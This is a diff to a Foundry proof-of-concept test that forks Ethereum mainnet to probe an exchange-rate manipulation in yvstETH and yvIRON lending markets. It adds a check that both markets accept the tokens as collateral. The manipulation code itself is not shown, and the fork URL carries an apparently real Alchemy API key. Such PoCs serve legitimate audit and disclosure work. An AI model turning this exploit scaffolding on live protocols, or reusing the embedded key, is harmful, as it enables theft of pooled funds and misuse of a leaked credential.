@@ -7,7 +7,8 @@ import "../src/interface.sol";
 contract PoC is Test{
     IERC20 yvstETH = IERC20(0x5faF6a2D186448Dfa667c51CB3D695c7A6E52d8E);
     ICErc20Delegate yvstETH_Market = ICErc20Delegate(0xD904235Dc0CD28f42AEECc0CD6A7126d871edaa4);
-    IUnitroller unitroller = IUnitroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
+    ICErc20Delegate yvIRON_Market = ICErc20Delegate(0xb7159DfbAB6C99d3d38CFb4E419eb3F6455bB547);
+    ICointroller unitroller = ICointroller(0x4dCf7407AE5C07f8681e1659f626E114A7667339);
     function setUp() public{
         vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/cTrc4K5LR0jvtNv875uTLvGIDGhv9nCi");
         payable(address(0)).transfer(address(this).balance);
@@ -30,5 +31,14 @@ contract PoC is Test{
         
         (,,, uint256 after_exchangeRate) = yvstETH_Market.getAccountSnapshot(address(this));
         console.log("exchangeRate after manipulation:", after_exchangeRate);
+    }
+    function test_check_collateralFactorMantissa() public{
+        (,uint collateralFactorMantissa,)=unitroller.markets(address(yvstETH_Market));
+        assert(collateralFactorMantissa > 0);
+        console.log("yvstETH_Market collateralFactorMantissa : ", collateralFactorMantissa);
+        
+        (,collateralFactorMantissa,)=unitroller.markets(address(yvIRON_Market));
+        assert(collateralFactorMantissa > 0);
+        console.log("yvIRON_Market collateralFactorMantissa : ", collateralFactorMantissa);
     }
 }
